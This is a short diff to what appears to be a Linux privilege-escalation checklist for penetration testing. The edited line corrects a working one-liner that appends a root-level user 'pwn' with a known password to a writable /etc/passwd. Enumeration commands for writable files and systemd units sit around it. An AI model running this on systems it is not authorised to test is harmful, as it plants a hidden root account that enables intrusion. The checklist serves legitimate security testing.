@@ -25,7 +25,7 @@
 - [ ] systemd timers: `systemctl list-timers --all`; permissions on units: `find /etc/systemd/ -writable 2>/dev/null`
 
 **Writable targets**
-- [ ] Writable `/etc/passwd`: `echo 'pwn:$(openssl passwd -1 -salt x pass):0:0::/root:/bin/bash' >> /etc/passwd` then `su pwn`; check `/etc/shadow`, `/etc/sudoers.d/`
+- [ ] Writable `/etc/passwd`: `H=$(openssl passwd -1 -salt x pass); echo "pwn:$H:0:0::/root:/bin/bash" >> /etc/passwd` then `su pwn` (password `pass`); check `/etc/shadow`, `/etc/sudoers.d/`
 - [ ] Writable PATH/service binary: `echo $PATH` (is there a `.`/writable directory before the system one?); `find / -perm -o+w -type f 2>/dev/null`
 
 **Kernel, containers, NFS**
